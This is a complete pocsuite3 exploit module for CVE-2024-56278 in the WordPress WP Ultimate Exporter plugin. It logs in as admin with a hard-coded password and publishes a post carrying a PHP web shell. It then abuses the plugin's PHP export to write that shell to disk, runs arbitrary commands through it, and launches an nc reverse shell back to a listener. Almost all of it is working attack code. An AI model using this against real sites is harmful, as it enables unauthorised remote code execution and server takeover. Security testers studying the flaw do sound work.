from pocsuite3.api import POCBase, register_poc, Output, OptDict, OptString, OrderedDict
from pocsuite3.api import get_listener_ip, get_listener_port, REVERSE_PAYLOAD
import requests
from bs4 import BeautifulSoup
import re
import urllib.parse

class WPUltimateExporterPOC(POCBase):
    vulID = 'CVE-2024-56278'
    version = '1'
    author = ['Exploited']
    vulDate = '2025-01-7'
    createDate = '2025-07-20'
    updateDate = '2025-07-20'
    references = ['https://github.com/DoTTak/CVE-2024-56278']
    name = 'WordPress WP Ultimate Exporter RCE PoC CVE-2024-56278'
    appPowerLink = 'https://wordpress.org/plugins/wp-ultimate-exporter/'
    appName = 'WP Ultimate Exporter'
    appVersion = '<=2.9.1'
    vulType = 'RCE'
    desc = '''
        This PoC exploits a Remote Code Execution vulnerability in the WordPress WP Ultimate Exporter plugin.
        The verify mode checks for the plugin's presence without authentication.
        The attack mode logs in as an admin, creates a post with a webshell, triggers the RCE, and executes a command.
    '''
    samples = []
    install_requires = []

    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('id', description='Command to execute', require=True)
        return o

    def _make_request(self, url, method='GET', data=None, json=None, headers=None, params=None, session=None, allow_redirects=True):
        if session is None:
            session = requests
        if headers is None:
            headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'close',
                'Upgrade-Insecure-Requests': '1'
            }
        try:
            if method == 'POST':
                if json is not None:
                    headers['Content-Type'] = 'application/json'  # Đặt Content-Type nếu json được cung cấp
                    response = session.post(
                        url,
                        json=json,
                        headers=headers,
                        params=params,
                        verify=False,
                        timeout=15,
                        allow_redirects=allow_redirects
                    )
                else:
                    response = session.post(
                        url,
                        data=data,
                        headers=headers,
                        params=params,
                        verify=False,
                        timeout=15,
                        allow_redirects=allow_redirects
                    )
            else:
                response = session.get(
                    url,
                    headers=headers,
                    params=params,
                    verify=False,
                    timeout=15,
                    allow_redirects=allow_redirects
                )
            response.raise_for_status()
            return response, None
        except requests.exceptions.RequestException as e:
            return None, f"Request failed: {e}"

    def _verify(self):
        result = {}
        base_url = self.url.rstrip('/')
        plugin_url = f"{base_url}/wp-content/plugins/wp-ultimate-exporter/Readme.txt"
        admin_url = f"{base_url}/wp-admin/admin.php"
        params = {"page": "com.smackcoders.csvimporternew.menu"}
        response, error = self._make_request(plugin_url, allow_redirects=False)
        if response and response.status_code == 200:
            if "WP Ultimate Exporter" in response.text:
                result['VerifyInfo'] = {
                    'URL': plugin_url,
                    'Status': 'WP Ultimate Exporter plugin detected',
                    'Message': 'Target is vulnerable'
                }
        response, error = self._make_request(admin_url, params=params, allow_redirects=True)
        if response is None:
            result['Error'] = error or "Failed to connect to the admin endpoint"
            return self.parse_output(result)

        if response.status_code == 200 and "smack_nonce_object" in response.text:
            nonce_pattern = r'var smack_nonce_object = .*?"nonce":"(.*?)"'
            nonce_match = re.search(nonce_pattern, response.text)
            if nonce_match:
                appVersion = '<=2.9.1'
                result['VerifyInfo'] = {
                    'URL': f"{admin_url}?{urllib.parse.urlencode(params)}",
                    'Status': 'WP Ultimate Exporter plugin detected, potential RCE vulnerability'
                }
        return self.parse_output(result)

    def _attack(self):
        result = {}
        base_url = self.url.rstrip('/')
        login_url = f"{base_url}/wp-login.php"
        admin_url = f"{base_url}/wp-admin/"
        ajax_url = f"{base_url}/wp-admin/admin-ajax.php"
        session = requests.Session()
        login_data = {
            "log": "admin",
            "pwd": "Admin@1503@",
            "wp-submit": "Log In",
            "testcookie": "1"
        }
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        response, error = self._make_request(login_url, method='POST', data=login_data, headers=headers, session=session)
        if response is None or "wordpress_logged_in_" not in str(session.cookies):
            result['Error'] = error or "Login failed: Invalid credentials or session issue"
            return self.parse_output(result)
        response, error = self._make_request(admin_url, session=session)

        response, error = self._make_request(f"{base_url}/wp-admin/post-new.php", session=session)
        if response is None:
            result['Error'] = error or "Failed to fetch post creation page"
            return self.parse_output(result)

        nonce_pattern = r'createNonceMiddleware\( "(.{10})" \)'
        nonce_match = re.search(nonce_pattern, response.text)
        if not nonce_match:
            result['Error'] = "Failed to extract wp_nonce from post-new.php"
            return self.parse_output(result)

        wp_nonce = nonce_match.group(1)

        headers = {"X-WP-Nonce": wp_nonce, "Content-Type": "application/json"}
        rest_nonce_url = f"{base_url}/wp-json/wp/v2/users/me"
        response, error = self._make_request(rest_nonce_url, method='GET', headers=headers, session=session)
        if response and response.status_code == 200:
            pass
        else:
            pass

        webshell_data = {
            "title": "WebShell",
            "content": "<pre>\n\t<?php\n\t    if(isset($_GET['cmd']))\n\t    {\n\t        system($_GET['cmd']);\n\t    }\n\t?>\n</pre>",
            "status": "publish",  
            "author": 1,
            "categories": [1]  
        }
        url = f"{base_url}/index.php/wp-json/wp/v2/posts"
        response, error = self._make_request(
            url,
            method='POST',
            headers=headers,
            json=webshell_data,
            session=session
        )
        if response:
            try:
                json_response = response.json()
                if isinstance(json_response, dict) and response.status_code in (200, 201):
                    post_id = json_response.get('id')
                    pass
                else:
                    error_msg = error or f"Failed to create webshell post, status code: {response.status_code}, response: {json_response}"
                    result['Error'] = error_msg
                    return self.parse_output(result)
            except ValueError as e:
                error_msg = f"Invalid JSON response: {str(e)}, raw response: {response.text if response else 'No response'}"
                result['Error'] = error_msg
                return self.parse_output(result)
        else:
            result['Error'] = error or "Failed to make request to create test post"
            return self.parse_output(result)

        params = {"page": "com.smackcoders.csvimporternew.menu"}
        response, error = self._make_request(f"{base_url}/wp-admin/admin.php", params=params, session=session)
        if response is None:
            result['Error'] = error or "Failed to fetch plugin page"
            return self.parse_output(result)

        nonce_pattern = r'var smack_nonce_object = .*?"nonce":"(.*?)"'
        nonce_match = re.search(nonce_pattern, response.text)
        if nonce_match:
            smack_nonce = nonce_match.group(1)
            data = {
                "action": "parse_data",
                "module": "Posts",
                "securekey": smack_nonce,
                "fileName": "webshell",
                "exp_type": "php",
                "export_mode": "normal",
                "offset": 0
            }
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            response, error = self._make_request(ajax_url, method='POST', data=data, headers=headers, session=session)
            if response is None:
                result['Error'] = error or "Failed to trigger RCE"
                return self.parse_output(result)
            exported_url = response.json()['exported_file']
        else:
            result['Error'] = "Failed to extract smack_nonce"
            return self.parse_output(result)

        # Step 4: Execute command
        cmd = self.get_option('cmd')
        params = {"cmd": f"echo \"START\";{cmd};echo \"END\";"}
        response, error = self._make_request(exported_url, params=params, session=session)
        if response is None:
            result['Error'] = error or "Command execution failed"
            return self.parse_output(result)

        pattern = r'START\n([\s\S]*?)\nEND'
        match = re.search(pattern, response.text)
        if match:
            cmd_output = match.group(1)
            pass
            pass
            for line in cmd_output.splitlines():
                pass
            pass
            result['AttackInfo'] = {
                'Web_Shell_URL': exported_url,
                'Command': cmd,
                'Command_Output': cmd_output,
                'Status': 'Command executed successfully'
            }
        return self.parse_output(result)

    def _shell(self):
        result = {}
        base_url = self.url.rstrip('/')
        web_shell_url = f"{base_url}/wp-content/uploads/smack_uci_uploads/exports/webshell.php"

        cmd = REVERSE_PAYLOAD.NC.format(get_listener_ip(), get_listener_port())
        encoded_payload = urllib.parse.quote(cmd)

        response, error = self._make_request(f"{web_shell_url}?cmd={encoded_payload}")
        if response is None:
            result['Error'] = error or "Reverse shell execution failed"
            return self.parse_output(result)

        result['ShellInfo'] = {
            'Web_Shell_URL': web_shell_url,
            'Status': 'Reverse shell executed successfully',
            'Listener': f"{get_listener_ip()}:{get_listener_port()}"
        }
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result.get('VerifyInfo') or result.get('AttackInfo') or result.get('ShellInfo'):
            output.success(result)
        else:
            output.fail(result.get('Error', 'Target is not vulnerable'))
        return output

register_poc(WPUltimateExporterPOC)
